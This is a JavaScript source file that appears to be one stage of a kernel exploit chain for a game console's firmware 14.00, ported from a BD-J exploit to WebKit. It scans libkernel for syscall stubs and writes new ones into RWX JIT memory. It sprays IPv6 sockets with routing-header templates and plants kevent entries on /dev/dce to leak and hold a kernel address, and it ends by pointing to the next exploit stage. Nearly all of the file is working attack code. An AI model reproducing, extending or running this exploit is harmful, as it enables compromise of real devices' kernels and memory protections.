import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";

// ============================================================================
// hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
// Stage 2 (leak scan) — FAITHFUL port of bytecode pc 5773-6760:
//   per round: disarm all -> re-arm all (CCCC/TTTT template) -> per CANDS
//   candidate: marked() -> open("/dev/dce",O_RDWR) -> kevent(-18 plant) ->
//   scan victims for [8]==(int)page && [12]==0 -> joined==1 -> replant
//   flags=2 -> HELD. kevent(-23) is one-time setup AFTER this (pc 9108),
//   NOT per attempt. dce = the /dev/dce FD; page=((dce&0xffff)<<16)|0x985a.
// v3: runtime libkernel rescan for stubs the stage-1 scanner missed.
// v4: if rescan fails, SYNTHESIZE missing stubs: copy close(6) stub into RWX
//     jitshm memory (jitshm_create=533), patch syscall number, register it.
// ============================================================================

const T = HX1400_TABLES;
const P = T.P;

const NUM = {
  close: 6, open: 5,
  socket: 97, socketpair: 135,
  setsockopt: 105, getsockopt: 118,
  kqueue: 362, kevent: 363,
  mmap: 477, munmap: 73,
  jitshm_create: 533,
};
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;
const TPL_LO = 0x43434343;      // template magic at +8 (bytecode ldc 0x43434343)
const TPL_HI = 0x54545454;      // template magic at +12
const DEV_DCE = "/dev/dce";     // opened O_RDWR per candidate (bytecode l137)
const OPS_OFF = 0x985a;         // bytecode: ((dce&0xffff)<<16)|0x985a
// CANDS = candidate fd indices into sprayed array (Hx1400.CANDS; values
// confirmed from clinit: idx20-29 = 232,8,16,48,80,112,144,176,208,240)
const CANDS = [8, 16, 48, 80, 112, 144, 176, 208, 232, 240];

const STATE = { ctx: null, kbase: 0n, kva: -1n };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) {
  if (typeof v === "bigint") return "0x" + v.toString(16);
  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
  return "0x" + (v < 0 ? (v >>> 0).toString(16) : Number(v).toString(16));
}
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }

// ---------- arena ----------
const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }

// --- stub resolution: stage-1 map -> libkernel rescan -> jitshm synth ---
// Orbis syscall stub shape: mov w8|x8, #num ; svc #0 ; ret
const SVC_INS = 0xd4000001;
let SCAN_SEEN = 0;
function findStubRaw(snum) {
  const p = ctx().p;
  const base = num(ctx().libkernelBase);
  const movW = (0x52800000 | ((snum & 0xffff) << 5) | 8) >>> 0;
  const movX = (0xd2800000 | ((snum & 0xffff) << 5) | 8) >>> 0;
  const LIMIT = 0x80000; // 512KB of libkernel (v3's 128KB was not enough)
  for (let off = 0; off < LIMIT; off += 4) {
    const w = p.read4(toI64(base + BigInt(off))) >>> 0;
    const top = w & 0xffe00000;
    if ((w === movW || w === movX)) {
      for (let k = 1; k <= 8; k++) {
        if ((p.read4(toI64(base + BigInt(off + 4 * k))) >>> 0) === SVC_INS)
          return base + BigInt(off);
      }
    }
    // sanity counter: any movz w8/x8 imm;svc pair
    if ((top === 0x52800000 || top === 0xd2800000) && ((w & 0x1f) === 8)) {
      for (let k = 1; k <= 3; k++) {
        if ((p.read4(toI64(base + BigInt(off + 4 * k))) >>> 0) === SVC_INS) { SCAN_SEEN++; break; }
      }
    }
  }
  return null;
}

// Build a missing stub in RWX jitshm memory from the close(6) donor.
function synthStub(targetNum) {
  const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
  const daddr = num(ctx().stubAddr.get(donorNum));
  const p = ctx().p;
  const w0 = p.read4(toI64(daddr)) >>> 0;
  const top = w0 & 0xffe00000;
  const imm = (w0 >> 5) & 0xffff;
  if ((top !== 0xd2800000 && top !== 0x52800000) || imm !== donorNum || (w0 & 0x1f) !== 8)
    return { err: "donor " + donorNum + " ins0=0x" + w0.toString(16) + " not movz" };
  let jfd = scn("jitshm_create", 0, 16384, 7);
  let usedName = false;
  if (jfd < 0) {
    const nb = allocBuf(32);
    zeroBuf(nb);
    jfd = scn("jitshm_create", nb.addr, 16384, 7);
    usedName = true;
  }
  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0); // MAP_SHARED
  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
  if (typeof p.write4 !== "function") return { err: "p.write4 missing" };
  const patched = (top | ((targetNum & 0xffff) << 5) | 8) >>> 0;
  p.write4(toI64(addr), patched);
  p.write4(toI64(addr + 4n), p.read4(toI64(daddr + 4n)) >>> 0);
  p.write4(toI64(addr + 8n), p.read4(toI64(daddr + 8n)) >>> 0);
  p.write4(toI64(addr + 12n), p.read4(toI64(daddr + 12n)) >>> 0);
  log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum +
      " ins0=0x" + w0.toString(16) + "->0x" + patched.toString(16) +
      " jfd=" + jfd + (usedName ? "(namebuf)" : "") + " rwx=" + h16(addr));
  return { addr };
}

function ensureStubs() {
  let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const addr = findStubRaw(NUM[k]);
    if (addr !== null) {
      ctx().stubAddr.set(NUM[k], toI64(addr));
      log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16));
    }
  }
  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
  missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const r = synthStub(NUM[k]);
    if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
    else log("SYNTH-FAIL", k + ": " + r.err);
  }
  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  if (still.length)
    fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" ") + " (rescan+synth failed)");
}

function scn(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}

function scn64(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
}

// ---------- stage-2 primitives (bytecode-exact) ----------
function buildTemplate() {
  const tpl = allocBuf(512);
  zeroBuf(tpl);
  tpl.dv.setUint8(1, 30);          // ip6r_len: (30+1)*8 = 248
  tpl.dv.setUint8(3, 15);          // ip6r_segleft = 15
  for (let off = 8; off + 8 <= RTH_LEN; off += 8) {
    tpl.dv.setUint32(off, TPL_LO, true);
    tpl.dv.setUint32(off + 4, TPL_HI, true);
  }
  return tpl;
}

function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }

// marked(): getsockopt rc==0 && len==248 && +8==CCCC && +12==TTTT  (still armed)
function marked(fd, rdb, lenp) {
  zeroBuf(rdb);
  lenp.dv.setUint32(0, RTH_LEN, true);
  lenp.dv.setUint32(4, 0, true);
  if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
  if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
  return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO &&
         (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
}

function phaseSpray(N) {
  const fds = [];
  for (let i = 0; i < N; i++) {
    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
    if (fd <= 0) break;
    fds.push(fd);
  }
  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
  log("SPRAY", "sockets=" + fds.length);
  const rth = allocBuf(512);
  for (const fd of fds) {
    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
  }
  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
  return { fds, rth };
}

// ---------- stage 2: leak scan (probe() pc 5773-6760, faithful) ----------
function phase2Leak(rootKq, fds) {
  const rdb = allocBuf(512);
  const lenp = allocBuf(8);
  const cl = allocBuf(64);
  const tpl = buildTemplate();
  const dev = allocBuf(32);
  zeroBuf(dev);
  for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));

  let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
  let kva = -1n, pageVal = 0n;
  let tries = 0;

  for (let attempt = 1; attempt <= 6; attempt++) {
    if (target >= 0 || tries >= 32) break;
    log("KV-ATTEMPT", attempt + "/6");
    for (const fd of fds) disarm(fd);
    for (const fd of fds) rearm(fd, tpl);
    log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);

    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 32; ci++) {
      const vi = CANDS[ci];
      if (vi >= fds.length) continue;
      const fd = fds[vi];
      if (!marked(fd, rdb, lenp)) continue;                 // must still be armed
      if (disarm(fd) !== 0) continue;
      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0);     // open("/dev/dce",O_RDWR)
      if (dce < 0) { rearm(fd, tpl); continue; }
      const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
      const pageInt = Number(page & 0xffffffffn) | 0;       // (int)page
      tries++;

      // plant #1: {ident=(int)dce, filter=-18, flags=1, +16=90}
      zeroBuf(cl);
      cl.dv.setUint32(0, dce >>> 0, true);
      cl.dv.setInt16(8, -18, true);
      cl.dv.setInt16(10, 1, true);
      cl.dv.setUint32(16, 90, true);
      let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " kevent rc=" + rc);
      if (rc !== 0) continue;

      // sweep all other victims
      let joined = 0;
      for (let j = 0; j < fds.length; j++) {
        if (j === vi) continue;
        zeroBuf(rdb);
        lenp.dv.setUint32(0, RTH_LEN, true);
        lenp.dv.setUint32(4, 0, true);
        if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
        const v8 = rdb.dv.getInt32(8, true);
        const v12 = rdb.dv.getUint32(12, true) >>> 0;
        if (v8 === pageInt && v12 === 0) {
          joined++;
          if (target < 0) { target = j; targetFd = fds[j]; }
          log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
        } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
          // still armed — leave it
        } else {
          rearm(fds[j], tpl);
        }
      }

      if (target >= 0 && joined === 1) {
        // plant #2 (HELD): flags=2, no +16 write
        zeroBuf(cl);
        cl.dv.setUint32(0, dce >>> 0, true);
        cl.dv.setInt16(8, -18, true);
        cl.dv.setInt16(10, 2, true);
        rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
        if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
        else {
          candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi +
              " dce=" + dce + " target=" + target + " page=" + h16(page));
        }
      }
    }
  }

  if (kva === -1n)
    fin("leak scan: no victim held (tries=" + tries + " target=" + target + ") — see KV-PLANT lines");
  STATE.kva = kva;
  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx);
  return { kva, page: pageVal };
}

export async function runKevent(c) {
  STATE.ctx = c;
  const kob = c.params && c.params.get ? c.params.get("kbase") : null;
  if (kob) {
    STATE.kbase = BigInt(kob);
    log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase));
  } else {
    if (!c.kbase) fin("kbase not provided - run route leak first");
    STATE.kbase = num(c.kbase);
  }
  log("KEVENT-PORT", "kbase=" + h16(STATE.kbase));

  const magic = ctx().p.read4(toI64(ctx().libkernelBase)) >>> 0;
  log("NATIVES-PROBE", "elf_magic=0x" + magic.toString(16) + " (0x464c457f=headers-mapped)");

  ensureStubs();
  log("NATIVES", Object.keys(NUM).map((k) => k + "=" + NUM[k] + "@0x" +
      num(ctx().stubAddr.get(NUM[k])).toString(16)).join(" "));

  const scratch16a = allocBuf(16), scratch16b = allocBuf(16);
  const buf32k = allocBuf(32768);
  const buf200 = allocBuf(200);
  const rth = allocBuf(512);
  const cl = allocBuf(64);
  log("ARENA", "blocks allocated");

  const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
  const victimCount = 8;
  const victims = [];
  for (let i = 0; i < victimCount; i++) {
    victims.push(scn("socket", AF_INET, SOCK_STREAM, 0));
  }
  log("VICTIMS", "anchor=" + anchorFd + " victims=" + victims.join(","));

  const { fds } = phaseSpray(256);

  const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
  const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
  log("MMAP-ANON", "page=" + h16(page));
  if (page < 0x10000n) fin("mmap anon failed rv=" + mr.i32 + " errno=" + ctx().errno());

  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");

  const res = phase2Leak(leakKq, fds);
  log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
  fin("stage2 DONE (kva held). Next: one-time EV_ADD -23 + fakeops build (bytecode pc 6760-9200)");
}
